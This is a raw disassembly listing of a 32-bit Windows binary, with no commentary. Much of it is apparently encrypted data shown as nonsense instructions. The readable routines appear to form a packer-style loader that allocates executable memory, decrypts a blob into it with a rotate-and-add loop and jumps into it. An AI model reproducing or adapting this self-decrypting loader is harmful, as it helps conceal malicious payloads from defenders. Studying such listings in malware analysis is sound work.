  4213d6:	fisttp QWORD PTR [ecx+0x2b]
  4213d9:	jl     0x4213e4
  4213db:	and    BYTE PTR [ecx-0x5c4cf9f2],bh
  4213e1:	jg     0x4213a9
  4213e3:	push   ebx
  4213e4:	push   0x47
  4213e6:	fdivrp st(0),st
  4213e8:	adc    al,0x53
  4213ea:	or     DWORD PTR [ecx+0x5f3dd8e1],esp
  4213f0:	test   al,0x20
  4213f2:	call   ecx
  4213f4:	fcom   QWORD PTR [ecx+0x5d85ace6]
  4213fa:	std    
  4213fb:	lahf   
  4213fc:	int    0x79
  4213fe:	addr16 fcmove st,st(1)
  421401:	fcmovbe st,st(4)
  421403:	outs   dx,BYTE PTR ds:[esi]
  421404:	mov    DWORD PTR [ecx+0x6997f9e6],ecx
  42140a:	fucomp st(5)
  42140c:	retf   
  42140d:	mov    ebx,0x76337250
  421412:	aas    
  421413:	retf   
  421414:	mov    ebx,0x6758c2
  421419:	xchg   ebx,eax
  42141a:	mov    WORD PTR [ebx+0x503e3b86],?
  421420:	int    0x3a
  421422:	and    DWORD PTR [ecx+ebx*4],0x30
  421426:	inc    edi
  421427:	cmp    DWORD PTR [edx-0x18],ecx
  42142a:	shl    ah,1
  42142c:	pop    ecx
  42142d:	imul   DWORD PTR [esi+0x1b]
  421430:	fidiv  DWORD PTR [ebx]
  421432:	inc    esp
  421433:	or     ebx,DWORD PTR [ecx]
  421435:	xchg   DWORD PTR [ecx],esp
  421437:	or     BYTE PTR [edi+ebx*8],dh
  42143a:	clc    
  42143b:	out    dx,eax
  42143c:	(bad)  
  42143d:	rep stos DWORD PTR es:[edi],eax
  42143f:	mov    ebp,0x1a1e3df8
  421444:	(bad)  
  421445:	iret   
  421446:	retf   
  421447:	sub    DWORD PTR [ebp+0x5b],ebx
  42144a:	and    bl,BYTE PTR [ecx-0xdbfb991]
  421450:	cdq    
  421451:	lods   eax,DWORD PTR ds:[esi]
  421452:	sbb    al,0xae
  421454:	sub    bh,dl
  421456:	jp     0x421493
  421458:	jbe    0x4214c7
  42145a:	je     0x421486
  42145c:	and    DWORD PTR [ebp+0x44],ebx
  42145f:	lds    edi,FWORD PTR [ecx+0x11]
  421462:	pop    edx
  421463:	fiadd  DWORD PTR [esi-0x15]
  421466:	pop    ds
  421467:	in     eax,dx
  421468:	xor    DWORD PTR [ecx],edi
  42146a:	pop    ds
  42146b:	jle    0x421465
  42146d:	dec    eax
  42146e:	das    
  42146f:	xor    bh,BYTE PTR [ecx]
  421471:	fnstcw WORD PTR [esi]
  421473:	sub    BYTE PTR [ebp+0x5d],ah
  421476:	ficomp DWORD PTR [esi-0x35]
  421479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42147a:	jge    0x42147f
  42147c:	xor    edx,DWORD PTR [esi-0x69059659]
  421482:	inc    edx
  421483:	popa   
  421484:	fsubr  DWORD PTR [eax+0x61a43848]
  42148a:	stc    
  42148b:	push   cs
  42148c:	sbb    eax,esi
  42148e:	inc    ebp
  42148f:	daa    
  421490:	imul   ebx,DWORD PTR [ebp+0x5bc33407],0x5e
  421497:	les    edx,FWORD PTR [ecx]
  421499:	adc    BYTE PTR [edi+0x3b],ch
  42149c:	sbb    ch,ah
  42149e:	dec    edi
  42149f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4214a0:	fwait
  4214a1:	mov    dl,BYTE PTR [esi+0x2c125ac6]
  4214a7:	icebp  
  4214a8:	stc    
  4214a9:	aam    0x21
  4214ab:	adc    eax,0x65eecefb
  4214b0:	mov    ds:0x8a41f494,eax
  4214b5:	mov    ecx,0x845c5353
  4214ba:	fisttp QWORD PTR [eax+0x31]
  4214bd:	sbb    ebx,DWORD PTR [ebp-0x3c]
  4214c0:	(bad)  
  4214c1:	aad    0xad
  4214c3:	pop    esi
  4214c4:	fldcw  WORD PTR [edi]
  4214c6:	xchg   edx,eax
  4214c7:	add    al,0xcb
  4214c9:	xor    eax,eax
  4214cb:	ret    
  4214cc:	nop
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
  421503:	movzx  ecx,BYTE PTR [eax+ecx*1]
  421507:	mov    edx,DWORD PTR [esp+0x10]
  42150b:	mov    eax,DWORD PTR [esp+0x1c]
  42150f:	add    edx,eax
  421511:	mov    DWORD PTR [esp+0x10],edx
  421515:	ror    eax,cl
  421517:	mov    eax,DWORD PTR [esp+0x10]
  42151b:	mov    edx,eax
  42151d:	shr    edx,0x3
  421520:	mov    ebx,0x1
  421525:	sub    ebx,edx
  421527:	imul   eax,ebx
  42152a:	mov    DWORD PTR [esp+0x10],eax
  42152e:	shl    ebx,0x3
  421531:	mov    bl,BYTE PTR [esi+edi*1]
  421534:	add    bl,cl
  421536:	mov    ecx,DWORD PTR [esp+0x20]
  42153a:	mov    BYTE PTR [esi+edi*1],bl
  42153d:	sub    esi,0x2
  421540:	cmp    esi,ecx
  421542:	jl     0x4214f4
  421544:	pop    edi
  421545:	pop    ebx
  421546:	pop    esi
  421547:	pop    ebp
  421548:	pop    ecx
  421549:	ret    
  42154a:	nop
  42154b:	nop
  42154c:	nop
  42154d:	nop
  42154e:	nop
  42154f:	nop
  421550:	push   ebp
  421551:	mov    ebp,esp
  421553:	sub    esp,0x78
  421556:	push   esi
  421557:	mov    DWORD PTR [ebp-0x50],0x0
  42155e:	mov    DWORD PTR [ebp-0x18],0x0
  421565:	mov    DWORD PTR [ebp-0x78],0x0
  42156c:	mov    DWORD PTR [ebp-0x68],0x0
  421573:	mov    DWORD PTR [ebp-0x8],0x0
  42157a:	mov    DWORD PTR [ebp-0x74],0x0
  421581:	mov    DWORD PTR [ebp-0x70],0x0
  421588:	mov    DWORD PTR [ebp-0x14],0x0
  42158f:	mov    DWORD PTR [ebp-0x54],0x0
  421596:	mov    DWORD PTR [ebp-0x10],0x0
  42159d:	mov    DWORD PTR [ebp-0x60],0x0
  4215a4:	mov    DWORD PTR [ebp-0x4],0x0
  4215ab:	mov    DWORD PTR [ebp-0x64],0x0
  4215b2:	mov    DWORD PTR [ebp-0x30],0x0
  4215b9:	mov    DWORD PTR [ebp-0x5c],0x0
  4215c0:	mov    DWORD PTR [ebp-0x2c],0x0
  4215c7:	mov    DWORD PTR [ebp-0x58],0x0
  4215ce:	mov    DWORD PTR [ebp-0xc],0x0
  4215d5:	mov    eax,ds:0x428108
  4215da:	mov    DWORD PTR [ebp-0x28],eax
  4215dd:	mov    ecx,DWORD PTR ds:0x42810c
  4215e3:	mov    DWORD PTR [ebp-0x24],ecx
  4215e6:	mov    edx,DWORD PTR ds:0x428110
  4215ec:	mov    DWORD PTR [ebp-0x20],edx
  4215ef:	mov    al,ds:0x428114
  4215f4:	mov    BYTE PTR [ebp-0x1c],al
  4215f7:	mov    ecx,DWORD PTR ds:0x4280f8
  4215fd:	mov    DWORD PTR [ebp-0x40],ecx
  421600:	mov    edx,DWORD PTR ds:0x4280fc
  421606:	mov    DWORD PTR [ebp-0x3c],edx
  421609:	mov    eax,ds:0x428100
  42160e:	mov    DWORD PTR [ebp-0x38],eax
  421611:	mov    cx,WORD PTR ds:0x428104
  421618:	mov    WORD PTR [ebp-0x34],cx
  42161c:	mov    dl,BYTE PTR ds:0x428106
  421622:	mov    BYTE PTR [ebp-0x32],dl
  421625:	mov    DWORD PTR [ebp-0x30],0x40
  42162c:	lea    eax,[ebp-0x10]
  42162f:	push   eax
  421630:	lea    ecx,[ebp-0x10]
  421633:	push   ecx
  421634:	lea    edx,[ebp-0x14]
  421637:	push   edx
  421638:	call   DWORD PTR ds:0x428000
  42163e:	test   eax,eax
  421640:	je     0x42164b
  421642:	mov    eax,DWORD PTR [ebp-0x10]
  421645:	add    eax,0x1
  421648:	mov    DWORD PTR [ebp-0x10],eax
  42164b:	mov    DWORD PTR [ebp-0x48],0x0
  421652:	mov    DWORD PTR [ebp-0x4c],0x0
  421659:	push   0x1
  42165b:	lea    ecx,[ebp-0x14]
  42165e:	push   ecx
  42165f:	call   DWORD PTR ds:0x428004
  421665:	mov    BYTE PTR [ebp-0x40],0x56
  421669:	call   DWORD PTR ds:0x428014
  42166f:	mov    DWORD PTR [ebp-0x2c],eax
  421672:	mov    BYTE PTR [ebp-0x3e],0x72
  421676:	movzx  edx,WORD PTR [ebp-0x2c]
  42167a:	test   edx,edx
  42167c:	jne    0x4216be
  42167e:	mov    BYTE PTR [ebp-0x34],0x0
  421682:	mov    DWORD PTR [ebp-0x14],0xe0d
  421689:	lea    eax,[ebp-0x28]
  42168c:	push   eax
  42168d:	call   DWORD PTR ds:0x428018
  421693:	mov    DWORD PTR [ebp-0x68],eax
  421696:	mov    DWORD PTR [ebp-0x5c],0x3a
  42169d:	lea    ecx,[ebp-0x40]
  4216a0:	push   ecx
  4216a1:	mov    edx,DWORD PTR [ebp-0x68]
  4216a4:	push   edx
  4216a5:	call   DWORD PTR ds:0x42801c
  4216ab:	mov    DWORD PTR [ebp-0x44],eax
  4216ae:	mov    DWORD PTR [ebp-0x8],0x4ecde765
  4216b5:	mov    DWORD PTR [ebp-0x70],0x10c93f
  4216bc:	jmp    0x4216d3
  4216be:	mov    BYTE PTR ds:0x443a58,0x0
  4216c5:	mov    BYTE PTR ds:0x42bb88,0x0
  4216cc:	mov    BYTE PTR ds:0x441b18,0x0
  4216d3:	mov    DWORD PTR [ebp-0x2c],0x410000
  4216da:	push   DWORD PTR ds:0x428018
  4216e0:	pop    edx
  4216e1:	mov    DWORD PTR [ebp-0x74],edx
  4216e4:	push   DWORD PTR [ebp-0x30]
  4216e7:	push   0x1000
  4216ec:	mov    eax,DWORD PTR [ebp-0x14]
  4216ef:	add    eax,0x23
  4216f2:	add    eax,0x23
  4216f5:	push   eax
  4216f6:	xor    eax,eax
  4216f8:	push   eax
  4216f9:	mov    ecx,DWORD PTR [ebp-0x44]
  4216fc:	call   ecx
  4216fe:	mov    edx,eax
  421700:	mov    DWORD PTR [ebp-0x4],edx
  421703:	mov    eax,DWORD PTR [ebp-0x70]
  421706:	sub    eax,0xdae0b
  42170b:	mov    DWORD PTR [ebp-0x70],eax
  42170e:	cmp    DWORD PTR [ebp-0x4],0x0
  421712:	jne    0x42171b
  421714:	mov    BYTE PTR ds:0x441b18,0x0
  42171b:	mov    ecx,DWORD PTR [ebp-0x4]
  42171e:	add    ecx,DWORD PTR [ebp-0x14]
  421721:	mov    edx,DWORD PTR [ebp-0x8]
  421724:	mov    DWORD PTR [ecx],edx
  421726:	mov    eax,DWORD PTR [ebp-0x4]
  421729:	add    eax,DWORD PTR [ebp-0x5c]
  42172c:	mov    DWORD PTR [ebp-0x64],eax
  42172f:	mov    ecx,DWORD PTR ds:0x42801c
  421735:	mov    DWORD PTR [ebp-0x54],ecx
  421738:	mov    edx,DWORD PTR [ebp-0x4]
  42173b:	add    edx,DWORD PTR [ebp-0x14]
  42173e:	mov    eax,DWORD PTR [ebp+0x8]
  421741:	mov    DWORD PTR [edx+0x4],eax
  421744:	mov    ecx,DWORD PTR [ebp-0x4]
  421747:	add    ecx,DWORD PTR [ebp-0x14]
  42174a:	mov    DWORD PTR [ebp-0xc],ecx
  42174d:	cmp    DWORD PTR [ebp-0x70],0x0
  421751:	jbe    0x42176e
  421753:	mov    edx,DWORD PTR [ebp-0xc]
  421756:	push   edx
  421757:	mov    eax,DWORD PTR [ebp-0x14]
  42175a:	push   eax
  42175b:	mov    ecx,DWORD PTR [ebp-0x2c]
  42175e:	add    ecx,DWORD PTR [ebp-0x70]
  421761:	push   ecx
  421762:	mov    edx,DWORD PTR [ebp-0x4]
  421765:	push   edx
  421766:	call   0x4214d0
  42176b:	add    esp,0x10
  42176e:	cmp    DWORD PTR [ebp-0x64],0x0
  421772:	je     0x421786
  421774:	mov    ecx,DWORD PTR [ebp-0x54]
  421777:	push   ecx
  421778:	push   DWORD PTR [ebp-0x74]
  42177b:	mov    esi,DWORD PTR [ebp-0x64]
  42177e:	push   edx
  42177f:	pop    eax
  421780:	push   ecx
  421781:	nop
  421782:	jmp    esi
  421784:	jmp    0x42178c
  421786:	mov    eax,DWORD PTR [ebp+0x8]
  421789:	mov    DWORD PTR [ebp-0x18],eax
  42178c:	mov    eax,0x1
  421791:	pop    esi
  421792:	mov    esp,ebp
  421794:	pop    ebp
  421795:	ret    
  421796:	int3   
  421797:	int3   
  421798:	int3   
  421799:	int3   
  42179a:	int3   
  42179b:	int3   
  42179c:	int3   
  42179d:	int3   
  42179e:	int3   
  42179f:	int3   
  4217a0:	push   ebp
  4217a1:	mov    ebp,esp
  4217a3:	sub    esp,0x8
  4217a6:	mov    eax,ds:0x428014
  4217ab:	push   0x0
  4217ad:	push   0xb2
  4217b2:	push   0x82
  4217b7:	push   0x0
  4217b9:	push   0xffffffff
  4217bb:	mov    DWORD PTR [ebp-0x4],0x0
  4217c2:	mov    DWORD PTR [ebp-0x8],eax
  4217c5:	call   DWORD PTR ds:0x428010
  4217cb:	push   DWORD PTR [ebp-0x8]
  4217ce:	pop    edx
  4217cf:	call   edx
  4217d1:	push   eax
  4217d2:	pop    DWORD PTR [ebp-0x4]
  4217d5:	mov    eax,DWORD PTR [ebp-0x4]
  4217d8:	dec    eax
  4217d9:	cmp    eax,0x56
  4217dc:	jne    0x4217eb
  4217de:	push   0xb263bdfd
  4217e3:	call   0x421550
  4217e8:	add    esp,0x4
  4217eb:	xor    eax,eax
  4217ed:	mov    esp,ebp
  4217ef:	pop    ebp
  4217f0:	ret    
  4217f1:	nop
  4217f2:	nop
  4217f3:	nop
  4217f4:	nop
  4217f5:	nop
  4217f6:	nop
  4217f7:	nop
  4217f8:	nop
  4217f9:	nop
  4217fa:	nop
  4217fb:	nop
  4217fc:	nop
  4217fd:	nop
  4217fe:	nop
  4217ff:	nop
  421800:	sub    esp,0x10
  421803:	lea    eax,[esp+0x0]
  421807:	push   eax
  421808:	call   DWORD PTR ds:0x42800c
  42180e:	cmp    WORD PTR [esp+0x0],0x0
  421814:	je     0x42182d
  421816:	push   0x0
  421818:	call   0x4217a0
  42181d:	add    esp,0x4
  421820:	call   0x411000
  421825:	xor    eax,eax
  421827:	add    esp,0x10
  42182a:	ret    0x10
  42182d:	push   DWORD PTR [ecx+edi*4-0x99e7a91]
  421834:	int3   
  421835:	dec    esi
  421836:	icebp  
  421837:	dec    ebp
  421838:	call   0xe348bb04
  42183d:	(bad)  
  42183e:	cmp    eax,0x4eccf662
  421843:	cmc    
  421844:	dec    ebp
  421845:	call   0xe43b75d1
  42184a:	inc    DWORD PTR [ebp+0x4eccf662]
  421850:	cmc    
  421851:	dec    ebp
  421852:	call   0xe43b761e
  421857:	inc    DWORD PTR [ebp+0x4eccf662]
  42185d:	cmc    
  42185e:	dec    ebp
  42185f:	call   0xe43b762b
  421864:	inc    DWORD PTR [ebp+0x4eccf662]
  42186a:	or     eax,0x53c7e84d
  42186f:	out    0x59,al
  421871:	icebp  
  421872:	test   esi,edx
  421874:	inc    DWORD PTR [ecx]
  421876:	outs   dx,DWORD PTR ds:[esi]
  421877:	dec    ebp
  421878:	dec    esp
  421879:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42187a:	or     bh,BYTE PTR [ebp+ebp*4-0x75]
  42187e:	xchg   esi,eax
  42187f:	test   BYTE PTR [edx-0x7a],0xbe
  421883:	and    DWORD PTR [edx+0x7daa893f],edx
  421889:	call   0xec82:0xdeb9182
  421890:	sub    al,0x90
  421892:	ins    DWORD PTR es:[edi],dx
  421893:	call   0xa591:0x8ad933b2
  42189a:	es mov ecx,0x22986e9f
  4218a0:	mov    WORD PTR [edx-0xa110b8d],fs
  4218a6:	mov    eax,ds:0x4eccf662
  4218ab:	cmc    
  4218ac:	dec    ebp
  4218ad:	call   0xba47dd72
  4218b2:	mov    esp,0x8ffcf07d
  4218b7:	mov    dh,0x67
  4218b9:	inc    edi
  4218ba:	stos   DWORD PTR es:[edi],eax
  4218bb:	aas    
  4218bc:	iret   
  4218bd:	repz mov ebx,0xa968899a
  4218c3:	xor    al,0xdc
  4218c5:	call   DWORD PTR ds:0x3b57ff8d
  4218cb:	sbb    ebp,DWORD PTR [ebp-0x71]
  4218ce:	cmp    dl,BYTE PTR [ebx-0x4a62bb0b]
  4218d4:	jp     0x4218a3
  4218d6:	jno    0x42194f
  4218d8:	(bad)  
  4218da:	ret    
  4218db:	call   0xe25c:0x7504c664
  4218e2:	lea    esp,[ebp+0x5b5e96b]
  4218e8:	arpl   sp,di
  4218ea:	xchg   esp,eax
  4218eb:	mov    dh,0x67
  4218ed:	inc    edi
  4218ee:	stos   DWORD PTR es:[edi],eax
  4218ef:	aas    
  4218f0:	into   
  4218f1:	repz retf 
  4218f3:	push   es
  4218f4:	pop    ss
  4218f5:	push   0xffce1449
  4218fa:	add    BYTE PTR [eax],dl
  4218fc:	push   ebp
  4218fd:	push   edi
  4218fe:	mov    eax,ds:0x6a8fc286
  421903:	push   cs
  421904:	pop    esi
  421905:	inc    esp
  421906:	lods   eax,DWORD PTR ds:[esi]
  421907:	sub    al,ah
  421909:	int    0x1f
  42190b:	add    DWORD PTR [ecx-0xb],esi
  42190e:	fld    QWORD PTR [edi]
  421910:	stc    
  421911:	(bad)  
  421912:	or     al,0xd
  421914:	(bad)  
  421916:	xchg   ebp,eax
  421917:	xor    al,0x9a
  421919:	mov    edi,DWORD PTR [ebp+edi*2+0x4eccfcf0]
  421920:	cmc    
  421921:	dec    ebp
  421922:	call   0xb43b76ee
  421927:	mov    edx,0xcdba6285
  42192c:	dec    esp
  42192d:	cmc    
  42192e:	in     eax,dx
  42192f:	cmp    BYTE PTR [edx+edx*1-0x7a001c07],ch
  421936:	(bad)  
  421937:	test   ah,0x4e
  42193a:	adc    eax,0x56c6eb4d
  42193f:	clc    
  421940:	jmp    0xf2ce9f44
  421945:	int3   
  421946:	dec    esi
  421947:	dec    ecx
  421948:	dec    ebx
  421949:	call   0xe43b7715
  42194e:	out    dx,al
  42194f:	cmp    BYTE PTR [edx-0xa],ah
  421952:	int3   
  421953:	pop    esi
  421954:	cmc    
  421955:	dec    ebp
  421956:	call   0xe43b7222
  42195b:	inc    esp
  42195d:	(bad)  
  42195e:	neg    ah
  421960:	dec    esi
  421961:	cmc    
  421962:	dec    ebp
  421963:	jmp    0x85fe:0xe3fc5dc7
  42196a:	(bad)  
  42196b:	test   ah,0x4e
  42196e:	lock dec ebp
  421970:	jmp    0xe43b773c
  421975:	inc    DWORD PTR [ebp+0x4eccfa32]
  42197b:	icebp  
  42197c:	dec    ebp
  42197d:	call   0xe43ed348
  421982:	std    
  421983:	test   DWORD PTR [edx+0x76],esp
  421986:	int3   
  421987:	dec    esi
  421988:	in     eax,0x4d
  42198a:	call   0xe43b7766
  42198f:	call   DWORD PTR [ebp+0x4edcf662]
  421995:	cmc    
  421996:	dec    ebp
  421997:	call   0xe42b7763
  42199c:	inc    DWORD PTR [ebp+0x4eccf662]
  4219a2:	cmc    
  4219a3:	dec    ebp
  4219a4:	call   0xf002c370
  4219a9:	(bad)  
  4219aa:	in     al,dx
  4219ab:	popa   
  4219ac:	test   ah,0x4e
  4219af:	add    eax,0x1488e846
  4219b4:	stc    
  4219b5:	jecxz  0x4219b6
  4219b7:	test   DWORD PTR [edx-0xa],esp
  4219ba:	int3   
  4219bb:	dec    esi
  4219bc:	cmc    
  4219bd:	dec    ebp
  4219be:	call   0xe43b778a
  4219c3:	inc    DWORD PTR [ebp+0x4eccf662]
  4219c9:	cmc    
  4219ca:	dec    ebp
  4219cb:	call   0xe43b7797
  4219d0:	inc    DWORD PTR [ebp+0x4eccf662]
  4219d6:	cmc    
  4219d7:	dec    ebp
  4219d8:	call   0xe43b77a4
  4219dd:	inc    DWORD PTR [ebp+0x4eccf662]
  4219e3:	cmc    
  4219e4:	dec    ebp
  4219e5:	call   0xe43b77b1
  4219ea:	inc    DWORD PTR [ebp+0x4eccf662]
  4219f0:	cmc    
  4219f1:	dec    ebp
  4219f2:	call   0xe43b77be
  4219f7:	inc    DWORD PTR [ebp+0x4eccf662]
  4219fd:	cmc    
  4219fe:	dec    ebp
  4219ff:	call   0xe43b77cb
  421a04:	inc    DWORD PTR [ebp+0x4eccf662]
  421a0a:	cmc    
  421a0b:	dec    ebp
  421a0c:	call   0xe43b77d8
  421a11:	inc    DWORD PTR [ebp+0x4eccf662]
  421a17:	cmc    
  421a18:	dec    ebp
  421a19:	call   0xe43b77e5
  421a1e:	shl    ecx,1
  421a20:	pop    es
  421a21:	mov    ?,WORD PTR [eax-0x17b20ab2]
  421a27:	daa    
  421a28:	push   esi
  421a29:	stc    
  421a2a:	jecxz  0x421a1b
  421a2c:	test   DWORD PTR [edx-0xa],esp
  421a2f:	sbb    BYTE PTR [edx-0xb],cl
  421a32:	dec    ebp
  421a33:	in     al,dx
  421a34:	(bad)  
  421a35:	pop    ebp
  421a36:	test   eax,0x36b7bca6
  421a3b:	mov    ecx,0x4df54ecc
  421a40:	call   0xe43b980c
  421a45:	pop    ds
  421a46:	stos   DWORD PTR es:[edi],eax
  421a47:	adc    BYTE PTR [ebp+0x4df52dbe],al
  421a4d:	call   0xe43b5819
  421a52:	push   DWORD PTR [ebp+0x69]
  421a55:	test   ah,0x14
  421a58:	cmc    
  421a59:	dec    ebp
  421a5a:	call   0xe43b737e
  421a5f:	inc    DWORD PTR [ebp+0x4eccf662]
  421a65:	cmc    
  421a66:	dec    ebp
  421a67:	call   0xe41b7833
  421a6c:	jmp    DWORD PTR [ebp+0x62]
  421a6f:	test   ah,0x4e
  421a72:	cmc    
  421a73:	dec    ebp
  421a74:	call   0xe43b7840
  421a79:	inc    DWORD PTR [ebp+0x4eccf662]
  421a7f:	cmc    
  421a80:	dec    ebp
  421a81:	call   0xe43b784d
  421a86:	inc    DWORD PTR [ebp+0x4eccf662]
  421a8c:	cmc    
  421a8d:	dec    ebp
  421a8e:	call   0xe43b785a
  421a93:	inc    DWORD PTR [ebp+0x4eccf662]
  421a99:	cmc    
  421a9a:	dec    ebp
  421a9b:	call   0xe43b7867
  421aa0:	inc    DWORD PTR [ebp+0x4eccf662]
  421aa6:	cmc    
  421aa7:	dec    ebp
  421aa8:	call   0xe43b7874
  421aad:	inc    DWORD PTR [ebp+0x4eccf662]
  421ab3:	cmc    
  421ab4:	dec    ebp
  421ab5:	call   0xe43b7881
  421aba:	inc    DWORD PTR [ebp+0x4eccf662]
  421ac0:	cmc    
  421ac1:	dec    ebp
  421ac2:	call   0xe43b788e
  421ac7:	inc    DWORD PTR [ebp+0x4eccf662]
  421acd:	cmc    
  421ace:	dec    ebp
  421acf:	call   0xe43b789b
  421ad4:	inc    DWORD PTR [ebp+0x4eccf662]
  421ada:	cmc    
  421adb:	dec    ebp
  421adc:	call   0xe43b78a8
  421ae1:	inc    DWORD PTR [ebp+0x4eccf662]
  421ae7:	cmc    
  421ae8:	dec    ebp
  421ae9:	call   0xe43b78b5
  421aee:	inc    DWORD PTR [ebp+0x4eccf662]
  421af4:	cmc    
  421af5:	dec    ebp
  421af6:	call   0xe43b78c2
  421afb:	inc    DWORD PTR [ebp+0x4eccf662]
  421b01:	cmc    
  421b02:	dec    ebp
  421b03:	call   0xe43b78cf
  421b08:	inc    DWORD PTR [ebp+0x4eccf662]
  421b0e:	cmc    
  421b0f:	dec    ebp
  421b10:	call   0xe43b78dc
  421b15:	inc    DWORD PTR [ebp+0x4eccf662]
  421b1b:	cmc    
  421b1c:	dec    ebp
  421b1d:	call   0xe43b78e9
  421b22:	inc    DWORD PTR [ebp+0x4eccf662]
  421b28:	cmc    
  421b29:	dec    ebp
  421b2a:	call   0xe43b78f6
  421b2f:	inc    DWORD PTR [ebp+0x4eccf662]
  421b35:	cmc    
  421b36:	dec    ebp
  421b37:	call   0xe43b7903
  421b3c:	inc    DWORD PTR [ebp+0x4eccf662]
  421b42:	cmc    
  421b43:	dec    ebp
  421b44:	call   0xe43b7910
  421b49:	inc    DWORD PTR [ebp+0x4eccf662]
  421b4f:	cmc    
  421b50:	dec    ebp
  421b51:	call   0xe43b791d
  421b56:	inc    DWORD PTR [ebp+0x4eccf662]
  421b5c:	cmc    
  421b5d:	dec    ebp
  421b5e:	call   0xe43b792a
  421b63:	inc    DWORD PTR [ebp+0x4eccf662]
  421b69:	cmc    
  421b6a:	dec    ebp
  421b6b:	call   0xe43b7937
  421b70:	inc    DWORD PTR [ebp+0x4eccf662]
  421b76:	cmc    
  421b77:	dec    ebp
  421b78:	call   0xe43b7944
  421b7d:	inc    DWORD PTR [ebp+0x4eccf662]
  421b83:	cmc    
  421b84:	dec    ebp
  421b85:	call   0xe43b7951
  421b8a:	inc    DWORD PTR [ebp+0x4eccf662]
  421b90:	cmc    
  421b91:	dec    ebp
  421b92:	call   0xe43b795e
  421b97:	inc    DWORD PTR [ebp+0x4eccf662]
  421b9d:	cmc    
  421b9e:	dec    ebp
  421b9f:	call   0xe43b796b
  421ba4:	inc    DWORD PTR [ebp+0x4eccf662]
  421baa:	cmc    
  421bab:	dec    ebp
  421bac:	call   0xe43b7978
  421bb1:	inc    DWORD PTR [ebp+0x4eccf662]
  421bb7:	cmc    
  421bb8:	dec    ebp
  421bb9:	call   0xe43b7985
  421bbe:	inc    DWORD PTR [ebp+0x4eccf662]
  421bc4:	cmc    
  421bc5:	dec    ebp
  421bc6:	call   0xe43b7992
  421bcb:	inc    DWORD PTR [ebp+0x4eccf662]
  421bd1:	cmc    
  421bd2:	dec    ebp
  421bd3:	call   0xe43b799f
  421bd8:	inc    DWORD PTR [ebp+0x4eccf662]
  421bde:	cmc    
  421bdf:	dec    ebp
  421be0:	call   0xe43b79ac
  421be5:	inc    DWORD PTR [ebp+0x4eccf662]
  421beb:	cmc    
  421bec:	dec    ebp
  421bed:	call   0xe43b79b9
  421bf2:	inc    DWORD PTR [ebp+0x4eccf662]
  421bf8:	cmc    
  421bf9:	dec    ebp
  421bfa:	call   0xe43b79c6
  421bff:	inc    DWORD PTR [ebp+0x4eccf662]
  421c05:	cmc    
  421c06:	dec    ebp
  421c07:	call   0xe43b79d3
  421c0c:	inc    DWORD PTR [ebp+0x4eccf662]
  421c12:	cmc    
  421c13:	dec    ebp
  421c14:	call   0xe43b79e0
  421c19:	inc    DWORD PTR [ebp+0x4eccf662]
  421c1f:	cmc    
  421c20:	dec    ebp
  421c21:	call   0xe43b79ed
  421c26:	inc    DWORD PTR [ebp+0x4eccf662]
  421c2c:	cmc    
  421c2d:	dec    ebp
  421c2e:	xchg   DWORD PTR [edi+0x56],ebp
  421c31:	stc    
  421c32:	int3   
  421c33:	inc    DWORD PTR [ebp+0x64ccf672]
  421c39:	push   edi
  421c3a:	xchg   edi,eax
  421c3b:	cdq    
  421c3c:	mov    eax,ds:0x787dd4a2
  421c41:	aad    0x8f
  421c43:	shl    BYTE PTR [ebx*2-0x497127bf],0xd9
  421c4b:	mov    ds:0x74324ef0,eax
  421c50:	fwait
  421c51:	sub    ah,al
  421c53:	je     0x421be0
  421c55:	(bad)  
  421c56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421c57:	int    0xc6
  421c59:	fcmove st,st(4)
  421c5b:	retf   0xe1d3
  421c5e:	out    dx,al
  421c5f:	dec    esi
  421c60:	shr    dl,cl
  421c62:	pusha  
  421c63:	xchg   edx,eax
  421c64:	or     al,0x94
  421c66:	dec    edx
  421c67:	int    0xb8
  421c69:	mov    edi,0xfa2e7de2
  421c6e:	xchg   ebx,eax
  421c6f:	int3   
  421c70:	jl     0x421c83
  421c72:	sub    ah,BYTE PTR [esi]
  421c74:	sar    BYTE PTR [ebp-0x4],1
  421c77:	cld    
  421c78:	and    ebp,DWORD PTR [edx]
  421c7a:	aad    0xee
  421c7c:	out    0x36,eax
  421c7e:	not    esp
  421c80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421c81:	xchg   ebx,eax
  421c83:	xor    esi,DWORD PTR [ebp+0x64b3ff02]
  421c89:	xchg   ebp,eax
  421c8a:	pop    edx
  421c8b:	fsub   QWORD PTR [ebx-0x1fce07ff]
  421c91:	lds    esp,FWORD PTR [edi-0x76422b56]
  421c97:	dec    esp
  421c98:	cmp    eax,0x62d3f75f
  421c9d:	leave  
  421c9e:	fiadd  WORD PTR [edi-0xc123557]
  421ca4:	cwde   
  421ca5:	out    dx,eax
  421ca6:	inc    ebx
  421ca7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421ca8:	inc    ebx
  421ca9:	dec    BYTE PTR [ebx-0x4c]
  421cac:	loop   0x421c5f
  421cae:	les    edi,FWORD PTR [esp+0x70]
  421cb2:	push   edx
  421cb3:	xchg   edi,eax
  421cb4:	inc    ecx
  421cb5:	mov    eax,ds:0x89fc4f38
  421cba:	mov    ah,BYTE PTR [eax+0x4]
  421cbd:	addr16 hlt 
  421cbf:	cmp    edx,ebp
  421cc1:	xchg   edi,eax
  421cc2:	js     0x421c71
  421cc4:	and    BYTE PTR [edx-0x40270cb6],ch
  421cca:	loop   0x421d17
  421ccc:	or     al,0xe1
  421cce:	push   eax
  421ccf:	stc    
